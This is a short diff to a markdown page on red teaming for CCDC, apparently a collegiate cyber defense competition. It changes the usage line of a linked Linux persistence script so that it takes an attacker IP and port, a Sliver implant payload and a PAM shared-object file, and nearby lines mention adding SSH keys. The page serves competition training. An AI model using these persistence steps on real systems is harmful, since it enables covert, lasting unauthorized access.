@@ -51,7 +51,7 @@ pagetitle: Red Teaming for CCDC
     - `-r` optional, used for kerberos
 
 **Linux:**
-- Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
+- Run [linux_persistence.sh {ip}:{port} {sliver_payload_file} {pam_so_file}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
   - Make sure to point the script to the correct location to pull the files from
     - Also make sure that 
 - Add SSH keys
